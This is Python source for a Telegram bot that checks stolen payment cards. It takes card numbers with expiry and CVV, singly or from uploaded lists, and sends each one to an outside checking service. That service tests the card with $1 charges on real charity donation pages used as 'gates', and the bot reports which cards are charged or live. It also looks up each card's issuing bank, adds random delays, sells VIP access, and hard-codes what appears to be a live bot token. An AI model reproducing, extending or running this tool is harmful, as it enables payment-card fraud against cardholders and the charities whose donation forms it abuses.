import os
import re
import time
import random
import asyncio
import httpx
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes
)

TOKEN = '8610138136:AAHHtP1A21F3NdW6hcQHocpgkcd-GF2EE_U'

# ------------------- Users -------------------
ADMINS = [6843321125]  # Telegram ID of admin only
VIP_USERS = {}  # Example: {user_id: subscription_end_timestamp}
stop_users = {}

# ------------------- Gates -------------------
GATES = [
    "https://raybensch.com/donations/support-ray/",
    "https://www.wfft.org/donations/general-donation/"
]
gate_index = 0
api_semaphore = asyncio.Semaphore(6)  # moderate rate

# ------------------- Codes -------------------
CODES = {}  # Example: {"CODE123": {"duration": 7, "max_users": 10, "used": 0}}

# ------------------- BIN Lookup -------------------
async def get_bin_info(bin_number):
    urls = [
        f"https://lookup.binlist.net/{bin_number}",
        f"https://bins.antipublic.cc/bins/{bin_number}",
        f"https://bincheck.io/api/{bin_number}"
    ]
    for attempt in range(3):
        for url in urls:
            try:
                async with httpx.AsyncClient(timeout=10) as client:
                    r = await client.get(url)
                    if r.status_code != 200:
                        continue
                    data = r.json()
                    brand = data.get("scheme") or data.get("brand") or data.get("type")
                    card_type = data.get("type") or data.get("card_type")
                    bank = (
                        data.get("bank", {}).get("name")
                        if isinstance(data.get("bank"), dict)
                        else data.get("bank")
                    )
                    country = (
                        data.get("country", {}).get("name")
                        if isinstance(data.get("country"), dict)
                        else data.get("country")
                    )
                    if not bank:
                        bank = data.get("issuer") or data.get("bank_name")
                    if not country:
                        country = data.get("country_name")
                    if brand or bank or country:
                        return (
                            f"{brand or 'Unknown'} - {card_type or 'Unknown'}",
                            bank or "Unknown",
                            country or "Unknown"
                        )
            except:
                continue
        await asyncio.sleep(0.5)
    return "Unknown", "Unknown", "Unknown"

# ------------------- Check API -------------------
async def check_card_api(card_full):
    global gate_index
    gate = GATES[gate_index]
    gate_index = (gate_index + 1) % len(GATES)
    params = {
        "url": gate,
        "card": card_full,
        "amount": 1.00
    }
    async with api_semaphore:
        try:
            async with httpx.AsyncClient(timeout=20) as client:
                r = await client.get("http://gatescheck.duckdns.org:7000/check", params=params)
            result_raw = r.json().get('result', '')
            result = result_raw.lower()
            if "charge" in result or "success" in result:
                return "approved", result_raw
            elif "insufficient" in result:
                return "live", result_raw
            else:
                return "declined", result_raw
        except:
            return "declined", "Error"

# ------------------- Format Response -------------------
async def format_response(card_full, status, response, taken):
    bin_number = card_full.split("|")[0][:6]
    info, bank, country = await get_bin_info(bin_number)
    if status == "approved":
        title = "#Charge ✅"
    elif status == "live":
        title = "#Live 🟢"
    else:
        title = "#Declined ❌"
    return f"""{title}

💳 Card: {card_full}
📨 Response: {response}

🏦 Info: {info}
🏛 Bank: {bank}
🌍 Country: {country}

⏱ Time: {taken}s
"""

# ------------------- Check Permissions -------------------
def can_user_check(user_id, mode="file"):
    if user_id in ADMINS:
        return True  # Admin unlimited
    elif user_id in VIP_USERS:
        return True  # VIP single/file
    else:
        return mode == "file"  # Normal users: file only

# ------------------- /pp -------------------
async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not can_user_check(user_id, mode="single"):
        await update.message.reply_text("❌ You do not have permission for single card check.")
        return
    asyncio.create_task(process_pp(update, context))

async def process_pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    card_full = " ".join(context.args)
    if not card_full:
        await update.message.reply_text("Usage:\n/pp 4242424242424242|09|28|123")
        return
    start_time = time.time()
    status, response = await check_card_api(card_full)
    taken = round(time.time() - start_time, 2)
    text = await format_response(card_full, status, response, taken)
    await update.message.reply_text(text)

# ------------------- /stop -------------------
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stop_users[user_id] = True
    await update.message.reply_text("Stopped ⛔")

# ------------------- /help -------------------
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMINS:
        await update.message.reply_text("❌ You are not an admin.")
        return
    commands = """
📜 Admin Commands:

/start - Start the bot
/pp - Check single card
/stop - Stop current check
/admin_panel - Open admin panel
"""
    await update.message.reply_text(commands)

# ------------------- File Handler -------------------
async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not can_user_check(user_id, mode="file"):
        await update.message.reply_text("❌ You do not have permission to check files.")
        return
    asyncio.create_task(process_file(update, context))

async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stop_users[user_id] = False

    os.makedirs("downloads", exist_ok=True)
    file = await update.message.document.get_file()
    file_path = f"downloads/{file.file_id}.txt"
    await file.download_to_drive(file_path)

    results_file_path = f"downloads/results_{file.file_id}.txt"
    approved = live = declined = 0
    panel_msg = await update.message.reply_text("Start Checking... 🔍")

    with open(file_path, 'r', encoding='utf-8') as f:
        lines = f.readlines()

    async def process_line(line):
        nonlocal approved, live, declined
        match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
        if not match:
            return None
        card_full = match[0]
        start_time = time.time()
        status, response = await check_card_api(card_full)
        await asyncio.sleep(random.uniform(1, 5))
        taken = round(time.time() - start_time, 2)
        text = await format_response(card_full, status, response, taken)
        if status == "approved":
            approved += 1
            await update.message.reply_text(text)
        elif status == "live":
            live += 1
            await update.message.reply_text(text)
        else:
            declined += 1  # Declined not sent

        last_info, last_bank, last_country = await get_bin_info(card_full.split("|")[0][:6])
        panel = f"""📊 Status

✅ Charge: {approved}
🟢 Live: {live}
❌ Declined: {declined}
📂 Total: {approved + live + declined}

━━━━━━━━━━━━━━━
💳 Last Card: {card_full}
📨 Response: {response}
🏦 Info: {last_info}
🏛 Bank: {last_bank}
🌍 Country: {last_country}
📌 Status: {status}
━━━━━━━━━━━━━━━

⛔ Stop: {'ON' if stop_users.get(user_id) else 'OFF'}
"""
        try:
            await panel_msg.edit_text(panel)
        except:
            pass
        return text

    for line in lines:
        if stop_users.get(user_id):
            await update.message.reply_text("Stopped ⛔")
            return
        await process_line(line)

    with open(results_file_path, 'w', encoding='utf-8') as result_file:
        for line in lines:
            r = await format_response(line.strip(), "N/A", "N/A", 0)
            result_file.write(r + "\n\n")

    await update.message.reply_text(f"Done ✅\nResults saved: {results_file_path}")

# ------------------- /start -------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Bot Ready ✅")

# ------------------- Admin Panel -------------------
async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMINS:
        await update.message.reply_text("❌ You are not an admin.")
        return

    keyboard = []
    for u in VIP_USERS.keys():
        uid = u
        keyboard.append([
            InlineKeyboardButton(f"{uid} - Ban", callback_data=f"ban_{uid}"),
            InlineKeyboardButton(f"{uid} - Unban", callback_data=f"unban_{uid}")
        ])
    if not keyboard:
        keyboard = [[InlineKeyboardButton("No users currently", callback_data="none")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Admin Panel: Users", reply_markup=reply_markup)

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    if user_id not in ADMINS:
        await query.edit_message_text("❌ You are not an admin.")
        return
    data = query.data
    if data.startswith("ban_"):
        uid = int(data.split("_")[1])
        VIP_USERS.pop(uid, None)
        await query.edit_message_text(f"User banned: {uid}")
    elif data.startswith("unban_"):
        uid = int(data.split("_")[1])
        VIP_USERS[uid] = int(time.time()) + 7*24*3600  # VIP 7 days example
        await query.edit_message_text(f"User unbanned: {uid}")

# ------------------- Run -------------------
def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("pp", pp))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("admin_panel", admin_panel))
    app.add_handler(CallbackQueryHandler(admin_callback))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.run_polling()

if __name__ == "__main__":
    main()
